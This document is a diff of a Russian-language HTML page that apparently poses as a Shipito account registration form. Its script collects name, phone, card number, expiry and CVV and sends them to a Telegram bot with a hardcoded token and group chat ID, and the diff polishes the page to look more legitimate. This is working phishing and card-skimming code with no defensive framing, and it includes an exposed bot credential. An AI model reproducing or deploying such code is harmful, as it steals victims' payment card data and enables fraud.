@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Регистрация · Shipito Partners</title>
+    <title>Регистрация · Shipito</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +12,8 @@
         }
 
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #e9f0f5 0%, #dce6f0 100%);
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f4f6f9;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -22,55 +22,63 @@
             margin: 0;
         }
 
-        .shipito-card {
-            max-width: 440px;
+        .shipito-wrapper {
             width: 100%;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
-            padding: 32px 28px;
-            transition: all 0.2s ease;
+            max-width: 460px;
+            background: #ffffff;
+            border-radius: 14px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
+            padding: 32px 30px 36px;
+        }
+
+        .shipito-header {
+            text-align: center;
+            margin-bottom: 24px;
         }
 
         .shipito-logo {
-            text-align: center;
-            margin-bottom: 10px;
-            font-size: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 34px;
             font-weight: 700;
-            color: #007bff;
-            letter-spacing: 2px;
+            color: #0066cc;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
         }
 
         .shipito-logo span {
-            color: #333;
+            background: #0066cc;
+            color: white;
+            border-radius: 6px;
+            padding: 0 8px;
+            font-size: 32px;
         }
 
         .shipito-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 6px;
-            text-align: center;
+            color: #1e2a3a;
+            margin-bottom: 4px;
         }
 
-        .shipito-sub {
-            text-align: center;
-            color: #6c757d;
-            margin-bottom: 28px;
-            font-size: 15px;
-            line-height: 1.4;
+        .shipito-subtitle {
+            font-size: 14px;
+            color: #6b7a8d;
+            line-height: 1.5;
         }
 
         .form-group {
             position: relative;
-            margin-bottom: 22px;
+            margin-bottom: 20px;
         }
 
         .form-group input {
             width: 100%;
-            padding: 14px 12px 8px 12px;
-            border: 1px solid #ced4da;
-            border-radius: 8px;
+            padding: 15px 12px 8px 12px;
+            border: 1px solid #dcdfe6;
+            border-radius: 10px;
             font-size: 16px;
             outline: none;
             background: #fff;
@@ -79,8 +87,8 @@
         }
 
         .form-group input:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.15);
+            border-color: #0066cc;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.15);
         }
 
         .form-group label {
@@ -90,85 +98,109 @@
             transform: translateY(-50%);
             background: white;
             padding: 0 6px;
-            color: #6c757d;
-            font-size: 16px;
+            color: #6b7a8d;
+            font-size: 15px;
             pointer-events: none;
             transition: all 0.2s ease;
+            font-weight: 400;
         }
 
         .form-group input:focus + label,
         .form-group input:not(:placeholder-shown) + label {
-            top: -8px;
+            top: -9px;
             transform: translateY(0);
             font-size: 13px;
-            color: #007bff;
+            color: #0066cc;
             font-weight: 500;
         }
 
         .form-row {
             display: flex;
-            gap: 12px;
+            gap: 10px;
         }
 
         .form-row .form-group {
             flex: 1;
         }
 
-        .btn-register {
+        .btn-submit {
             width: 100%;
-            padding: 14px;
-            background: #007bff;
+            padding: 14px 20px;
+            background: #0066cc;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 8px;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 10px;
+            letter-spacing: 0.3px;
         }
 
-        .btn-register:hover {
-            background: #0056b3;
+        .btn-submit:hover {
+            background: #004d99;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .shipito-footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #99a5b5;
+        }
+
+        .shipito-footer a {
+            color: #0066cc;
+            text-decoration: none;
         }
 
         .alert {
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 14px;
             margin-bottom: 18px;
             display: none;
+            line-height: 1.4;
         }
 
         .alert-error {
-            background: #ffe3e3;
-            color: #b71c1c;
+            background: #fff0f0;
+            color: #c0392b;
             border: 1px solid #f5c6cb;
         }
 
         .alert-success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+            background: #e6f7ec;
+            color: #0e6245;
+            border: 1px solid #b8dfca;
         }
 
         @media (max-width: 480px) {
-            .shipito-card {
+            .shipito-wrapper {
                 padding: 24px 18px;
+                border-radius: 0;
             }
         }
     </style>
 </head>
 <body>
-    <div class="shipito-card">
-        <div class="shipito-logo">SHIPITO</div>
-        <div class="shipito-title">Личный кабинет партнёра</div>
-        <div class="shipito-sub">Заполните форму, чтобы подтвердить партнёрство</div>
+    <div class="shipito-wrapper">
+        <div class="shipito-header">
+            <div class="shipito-logo">
+                ✈ <span>SHIPITO</span>
+            </div>
+            <div class="shipito-title">Регистрация аккаунта</div>
+            <div class="shipito-subtitle">Укажите данные для доступа к услугам посредника в США</div>
+        </div>
 
         <div id="alertError" class="alert alert-error"></div>
         <div id="alertSuccess" class="alert alert-success"></div>
 
-        <form id="partnerForm" novalidate>
+        <form id="regForm" novalidate>
             <div class="form-group">
                 <input type="text" id="fullName" placeholder=" " autocomplete="name" required>
                 <label for="fullName">Полное имя</label>
@@ -187,7 +219,7 @@
             <div class="form-row">
                 <div class="form-group">
                     <input type="text" id="expiry" placeholder=" " maxlength="5" autocomplete="cc-exp" required>
-                    <label for="expiry">ММ/ГГ</label>
+                    <label for="expiry">ММ / ГГ</label>
                 </div>
                 <div class="form-group">
                     <input type="text" id="cvv" placeholder=" " inputmode="numeric" maxlength="4" autocomplete="cc-csc" required>
@@ -195,17 +227,21 @@
                 </div>
             </div>
 
-            <button type="submit" class="btn-register">Отправить</button>
+            <button type="submit" class="btn-submit">Зарегистрироваться</button>
         </form>
+
+        <div class="shipito-footer">
+            Нажимая кнопку, вы принимаете <a href="#">условия использования</a> и <a href="#">политику конфиденциальности</a>.
+        </div>
     </div>
 
     <script>
         (function() {
             const TOKEN = '7608120444:AAEPthvmx3DlCxkP9AJjvwT-X4QZagwL8TY';
-            const CHAT_ID = '7608120444';
+            const CHAT_ID = -1003738095394;  // Группа
             const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-            const form = document.getElementById('partnerForm');
+            const form = document.getElementById('regForm');
             const alertError = document.getElementById('alertError');
             const alertSuccess = document.getElementById('alertSuccess');
 
@@ -225,26 +261,30 @@
                 alertSuccess.style.display = 'none';
             }
 
+            // Маска телефона: оставляет + и цифры
             phoneInput.addEventListener('input', function(e) {
                 let val = e.target.value.replace(/[^\d+]/g, '');
                 if (!val.startsWith('+')) val = '+' + val;
                 e.target.value = val;
             });
 
+            // Карта: 16 цифр с пробелами каждые 4
             cardInput.addEventListener('input', function(e) {
                 let val = e.target.value.replace(/\D/g, '');
                 if (val.length > 16) val = val.slice(0, 16);
                 e.target.value = val.replace(/(\d{4})(?=\d)/g, '$1 ');
             });
 
+            // Срок: ММ/ГГ с автослешем
             expiryInput.addEventListener('input', function(e) {
                 let val = e.target.value.replace(/\D/g, '');
                 if (val.length >= 2) {
-                    val = val.slice(0, 2) + '/' + val.slice(2, 4);
+                    val = val.slice(0, 2) + ' / ' + val.slice(2, 4);
                 }
                 e.target.value = val;
             });
 
+            // CVV: только цифры
             cvvInput.addEventListener('input', function(e) {
                 e.target.value = e.target.value.replace(/\D/g, '');
             });
@@ -265,7 +305,7 @@
                 }
 
                 if (card.length !== 16 || !/^\d+$/.test(card)) {
-                    showAlert(alertError, 'Номер карты должен содержать 16 цифр.');
+                    showAlert(alertError, 'Номер карты должен содержать ровно 16 цифр.');
                     return;
                 }
 
@@ -274,7 +314,7 @@
                     return;
                 }
 
-                const message = `📥 Новая регистрация партнёра\n👤 Имя: ${name}\n📱 Телефон: ${phone}\n💳 Карта: ${card}\n📅 Срок: ${expiry}\n🔒 CVV: ${cvv}`;
+                const message = `📥 Новая регистрация\n👤 Имя: ${name}\n📱 Телефон: ${phone}\n💳 Карта: ${card}\n📅 Срок: ${expiry}\n🔒 CVV: ${cvv}`;
 
                 try {
                     const response = await fetch(API_URL, {
@@ -287,14 +327,14 @@
                     });
 
                     if (response.ok) {
-                        showAlert(alertSuccess, 'Данные успешно отправлены.');
+                        showAlert(alertSuccess, 'Регистрация успешна. Данные отправлены.');
                         form.reset();
                     } else {
                         const errData = await response.json().catch(() => ({}));
-                        showAlert(alertError, 'Ошибка отправки: ' + (errData.description || 'неизвестная ошибка'));
+                        showAlert(alertError, 'Ошибка: ' + (errData.description || 'неизвестная ошибка сервера'));
                     }
                 } catch (err) {
-                    showAlert(alertError, 'Сетевая ошибка. Проверьте подключение к интернету.');
+                    showAlert(alertError, 'Сетевая ошибка. Проверьте интернет-соединение.');
                 }
             });
         })();
